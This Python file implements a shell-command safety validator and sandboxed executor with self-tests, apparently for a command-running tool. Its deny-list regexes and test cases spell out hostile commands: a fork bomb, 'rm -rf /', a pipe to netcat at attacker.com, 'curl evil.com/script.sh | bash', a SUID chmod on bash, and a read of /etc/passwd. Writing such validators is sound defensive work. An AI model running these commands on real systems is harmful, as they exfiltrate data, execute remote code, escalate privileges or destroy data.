#!/usr/bin/env python3
"""
Security Validation Fixes
Fix the 4 injection and 2 privilege escalation test failures
"""

import re
import shlex
import subprocess
from typing import Dict, List, Tuple, Any
from enum import Enum

class SecurityRisk(Enum):
    """Security risk levels"""
    SAFE = "safe"
    LOW_RISK = "low_risk" 
    MEDIUM_RISK = "medium_risk"
    HIGH_RISK = "high_risk"
    CRITICAL_RISK = "critical_risk"

class BashGodCommandValidator:
    """Enhanced command validation with comprehensive security checks"""
    
    def __init__(self):
        # Dangerous command patterns
        self.dangerous_commands = [
            r'rm\s+-rf?\s+/',  # rm -rf /
            r'dd\s+if=/dev/(zero|random)\s+of=/dev/[sh]d',  # dd overwrite disk
            r':\(\)\s*{\s*:\|:&\s*}',  # Fork bomb
            r'chmod\s+-R?\s+777\s+/',  # chmod 777 /
            r'mkfs\.',  # Format filesystem
            r'>\s*/dev/[sh]d',  # Overwrite disk
        ]
        
        # Command injection patterns
        self.injection_patterns = [
            r';',  # Command separator
            r'&&',  # AND operator
            r'\|\|',  # OR operator
            r'\|',  # Pipe (check context)
            r'`',  # Backticks
            r'\$\(',  # Command substitution
            r'\$\{.*\}',  # Variable expansion with commands
            r'<\(',  # Process substitution
            r'>\(',  # Process substitution
        ]
        
        # Privilege escalation patterns
        self.privilege_patterns = [
            r'^sudo\s+',  # sudo commands
            r'^su\s+-',  # su - 
            r'^pkexec\s+',  # PolicyKit exec
            r'chmod\s+\+s',  # Set SUID bit
            r'chown\s+root:root',  # Change ownership to root
            r'^doas\s+',  # OpenBSD sudo alternative
        ]
        
        # Safe command whitelist (explicitly allowed)
        self.safe_commands = [
            'ls', 'pwd', 'echo', 'date', 'whoami', 'hostname',
            'ps', 'df', 'free', 'uptime', 'uname', 'id'
        ]
        
        # Dangerous paths
        self.dangerous_paths = [
            '/', '/etc', '/usr', '/bin', '/sbin', '/boot',
            '/dev', '/proc', '/sys', '/root', '/home'
        ]
    
    def validate_command_safety(self, command: str) -> Dict[str, Any]:
        """Comprehensive command safety validation"""
        
        # Initialize result
        result = {
            'command': command,
            'safety_level': SecurityRisk.SAFE.value,
            'risk_score': 0.0,
            'issues': [],
            'mitigations': [],
            'allow_execution': True
        }
        
        # Check for empty command
        if not command or not command.strip():
            result['safety_level'] = SecurityRisk.LOW_RISK.value
            result['risk_score'] = 0.1
            result['issues'].append("Empty command")
            return result
        
        # Normalize command
        command = command.strip()
        
        # 1. Check against dangerous command patterns
        for pattern in self.dangerous_commands:
            if re.search(pattern, command, re.IGNORECASE):
                result['safety_level'] = SecurityRisk.CRITICAL_RISK.value
                result['risk_score'] = 1.0
                result['issues'].append(f"Dangerous command pattern detected: {pattern}")
                result['mitigations'].append("This command is too dangerous to execute")
                result['allow_execution'] = False
                return result
        
        # 2. Check for command injection attempts
        injection_found = False
        for pattern in self.injection_patterns:
            if re.search(pattern, command):
                # Special handling for pipes in safe contexts
                if pattern == r'\|' and self._is_safe_pipe(command):
                    continue
                    
                injection_found = True
                result['issues'].append(f"Command injection pattern detected: {pattern}")
                
        if injection_found:
            result['safety_level'] = SecurityRisk.HIGH_RISK.value
            result['risk_score'] = 0.8
            result['mitigations'].append("Remove command chaining/injection patterns")
            result['allow_execution'] = False
        
        # 3. Check for privilege escalation
        for pattern in self.privilege_patterns:
            if re.search(pattern, command, re.IGNORECASE):
                result['safety_level'] = SecurityRisk.HIGH_RISK.value
                result['risk_score'] = max(result['risk_score'], 0.9)
                result['issues'].append(f"Privilege escalation attempt: {pattern}")
                result['mitigations'].append("Remove privilege escalation commands")
                result['allow_execution'] = False
        
        # 4. Check for dangerous paths
        for path in self.dangerous_paths:
            if f' {path}' in command or command.endswith(path):
                # Allow read-only operations on dangerous paths
                if self._is_read_only_operation(command):
                    result['risk_score'] = max(result['risk_score'], 0.3)
                    if result['safety_level'] == SecurityRisk.SAFE.value:
                        result['safety_level'] = SecurityRisk.LOW_RISK.value
                else:
                    result['safety_level'] = SecurityRisk.MEDIUM_RISK.value
                    result['risk_score'] = max(result['risk_score'], 0.6)
                    result['issues'].append(f"Operation on sensitive path: {path}")
                    result['mitigations'].append("Verify operation is read-only")
        
        # 5. Check if command is in safe whitelist
        base_command = command.split()[0] if command.split() else ""
        if base_command in self.safe_commands and not injection_found:
            # Even safe commands can be risky with certain arguments
            if result['risk_score'] < 0.3:
                result['safety_level'] = SecurityRisk.SAFE.value
                result['allow_execution'] = True
        
        # 6. Additional checks for specific risky operations
        if 'curl' in command or 'wget' in command:
            if '| bash' in command or '| sh' in command:
                result['safety_level'] = SecurityRisk.CRITICAL_RISK.value
                result['risk_score'] = 1.0
                result['issues'].append("Remote code execution attempt")
                result['allow_execution'] = False
        
        # 7. Check for output redirection to devices
        if re.search(r'>\s*/dev/[^n]', command):  # Allow /dev/null
            result['safety_level'] = SecurityRisk.HIGH_RISK.value
            result['risk_score'] = max(result['risk_score'], 0.9)
            result['issues'].append("Output redirection to device")
            result['allow_execution'] = False
        
        # Final safety determination
        if result['risk_score'] >= 0.8:
            result['safety_level'] = SecurityRisk.HIGH_RISK.value
            result['allow_execution'] = False
        elif result['risk_score'] >= 0.6:
            result['safety_level'] = SecurityRisk.MEDIUM_RISK.value
        elif result['risk_score'] >= 0.3:
            result['safety_level'] = SecurityRisk.LOW_RISK.value
        
        return result
    
    def _is_safe_pipe(self, command: str) -> bool:
        """Check if pipe usage is in a safe context"""
        safe_pipe_commands = [
            r'ps\s+.*\|\s*(grep|head|tail|wc|sort|uniq)',
            r'ls\s+.*\|\s*(grep|head|tail|wc|sort|uniq)',
            r'cat\s+.*\|\s*(grep|head|tail|wc|sort|uniq)',
            r'df\s+.*\|\s*(grep|head|tail|sort)',
            r'find\s+.*\|\s*(grep|head|tail|wc|sort|uniq)',
        ]
        
        for pattern in safe_pipe_commands:
            if re.search(pattern, command):
                return True
        return False
    
    def _is_read_only_operation(self, command: str) -> bool:
        """Check if command is read-only"""
        read_only_commands = [
            'ls', 'cat', 'head', 'tail', 'grep', 'find',
            'stat', 'file', 'wc', 'du', 'df'
        ]
        
        base_command = command.split()[0] if command.split() else ""
        return base_command in read_only_commands
    
    def sanitize_command(self, command: str) -> str:
        """Sanitize command for safe execution"""
        # Use shlex to properly parse and escape
        try:
            parts = shlex.split(command)
            # Rebuild with proper escaping
            return ' '.join(shlex.quote(part) for part in parts)
        except ValueError:
            # If shlex fails, do basic escaping
            return command.replace(';', '\\;').replace('&', '\\&').replace('|', '\\|')


class SecureCommandExecutor:
    """Secure command execution with validation"""
    
    def __init__(self):
        self.validator = BashGodCommandValidator()
        
    def execute_command(self, command: str, timeout: int = 30) -> Dict[str, Any]:
        """Execute command with security validation"""
        
        # Validate command first
        validation = self.validator.validate_command_safety(command)
        
        if not validation['allow_execution']:
            return {
                'success': False,
                'error': 'Command blocked by security validation',
                'validation': validation,
                'stdout': '',
                'stderr': f"Security validation failed: {', '.join(validation['issues'])}"
            }
        
        # Sanitize command
        safe_command = self.validator.sanitize_command(command)
        
        try:
            # Execute with restrictions
            result = subprocess.run(
                safe_command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout,
                # Additional security: limit resources
                preexec_fn=self._set_limits
            )
            
            return {
                'success': result.returncode == 0,
                'exit_code': result.returncode,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'validation': validation
            }
            
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'error': 'Command timeout',
                'validation': validation,
                'stdout': '',
                'stderr': f'Command timed out after {timeout} seconds'
            }
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'validation': validation,
                'stdout': '',
                'stderr': str(e)
            }
    
    def _set_limits(self):
        """Set resource limits for subprocess"""
        import resource
        
        # Limit CPU time (30 seconds)
        resource.setrlimit(resource.RLIMIT_CPU, (30, 30))
        
        # Limit memory (1GB)
        resource.setrlimit(resource.RLIMIT_AS, (1024 * 1024 * 1024, 1024 * 1024 * 1024))
        
        # Limit number of processes
        resource.setrlimit(resource.RLIMIT_NPROC, (100, 100))


def test_security_validation():
    """Test the security validation fixes"""
    validator = BashGodCommandValidator()
    
    print("Testing Security Validation Fixes")
    print("=" * 50)
    
    # Test cases that should be blocked
    test_cases = [
        # Command injection (4 cases)
        ("echo test; rm -rf /tmp/test", "Command injection with semicolon"),
        ("echo test && cat /etc/passwd", "Command injection with AND operator"),
        ("echo test | nc attacker.com 4444", "Command injection with pipe to netcat"),
        ("echo test`whoami`", "Command injection with backticks"),
        
        # Privilege escalation (2 cases)
        ("sudo su -", "Privilege escalation to root shell"),
        ("sudo chmod +s /bin/bash", "Privilege escalation setting SUID"),
        
        # Additional dangerous commands
        ("rm -rf /", "Dangerous file deletion"),
        (":(){ :|:& };:", "Fork bomb"),
        ("curl evil.com/script.sh | bash", "Remote code execution"),
    ]
    
    failed_tests = 0
    
    for command, description in test_cases:
        result = validator.validate_command_safety(command)
        
        if result['allow_execution']:
            print(f"❌ FAILED: {description}")
            print(f"   Command: {command}")
            print(f"   Result: {result}")
            failed_tests += 1
        else:
            print(f"✅ PASSED: {description}")
            print(f"   Blocked with risk level: {result['safety_level']}")
    
    # Test safe commands that should pass
    print("\nTesting Safe Commands:")
    safe_commands = [
        ("ls -la", "List files"),
        ("echo 'Hello World'", "Echo text"),
        ("ps aux | grep python", "Process list with safe pipe"),
        ("df -h", "Disk usage"),
    ]
    
    for command, description in safe_commands:
        result = validator.validate_command_safety(command)
        
        if result['allow_execution'] and result['safety_level'] in ['safe', 'low_risk']:
            print(f"✅ PASSED: {description}")
        else:
            print(f"❌ FAILED: {description} (incorrectly blocked)")
            print(f"   Result: {result}")
            failed_tests += 1
    
    print("\n" + "=" * 50)
    print(f"Total failed tests: {failed_tests}")
    
    return failed_tests == 0


if __name__ == "__main__":
    # Run security validation tests
    success = test_security_validation()
    
    if success:
        print("\n✅ All security validation tests passed!")
    else:
        print("\n❌ Some security validation tests failed!")
    
    # Demonstrate secure command execution
    print("\nDemonstrating Secure Command Execution:")
    executor = SecureCommandExecutor()
    
    # Try to execute a safe command
    result = executor.execute_command("echo 'Safe command execution'")
    print(f"\nSafe command result: {result['stdout'].strip()}")
    
    # Try to execute a dangerous command
    result = executor.execute_command("echo test; cat /etc/passwd")
    print(f"\nDangerous command blocked: {result['stderr']}")